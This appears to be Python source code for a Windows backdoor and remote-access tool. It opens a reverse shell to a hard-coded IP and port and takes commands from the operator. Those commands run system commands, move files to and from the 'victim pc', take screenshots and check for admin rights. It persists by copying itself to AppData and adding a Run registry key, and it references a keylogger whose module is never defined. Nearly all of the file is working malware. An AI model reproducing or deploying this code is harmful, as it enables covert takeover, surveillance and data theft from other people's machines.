#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import base64
import shutil
import sys
import requests
import ctypes
import mss
from mss import mss


	
def reliable_send(data):
	json_data = json.dumps(data)
	sock.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + sock.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue

def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
	except:
		admin="User Privileges"
	else:
		admin="Administrator"

def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def execute_system_command(command):
	return subprocess.check_output(command, shell=True)
		


def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)
	

def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("192.168.0.109", 54321))
			shell()
		except:
			connection()
	
		

def shell():
	while True:
		command = reliable_recv()
		if command == "exit":
			try:
				os.remove(keylogger_path)
			except:
				continue
			break
		elif command == "help":
			help_options = '''                                          download path -> Download a file from victim pc
					  upload path   -> upload a file to victim pc
					  get url       -> Download file to victim pc from website
					  start path    -> Start a program in victim pc
					  screenshot    -> Take screenshot of victim pc
					  check         -> check for administrator previliges
					  exit          -> Exit the Revershell....
					  keylog_start  -> Start the keylogger
					  keylog_dump   -> To show the Keystrokes '''
			reliable_send(help_options)
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				result = reliable_recv()
				fin.write(base64.b64decode(result))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded file from specified URL!")
			except:
				reliable_send("[!!] Failed To Download file")
		elif command == "start":
			try:
				subprocess.Popen(command, shell=True)
				reliable_send("[+] Started!")
			except:
				reliable_send("[!!] Failed to start!")
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png", "rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				
			except:
				reliable_send("[!!] Failed to Screenshot!")
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("can't perform the check")
		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target=keylogger.start)
			t1.start()
		elif command[:11] == "keylog_dump":
			fn = open(keylogger_path, "r")
			reliable_send(fn.read())
		else:
			try:
				command_result = execute_system_command(command)
				reliable_send(command_result)
					
			except:
				reliable_send("[!!]Can't Execute Command!")

keylogger_path = os.environ["appdata"] + "\\keylogger.txt"
location = os.environ["appdata"] + "\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
			
		
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close
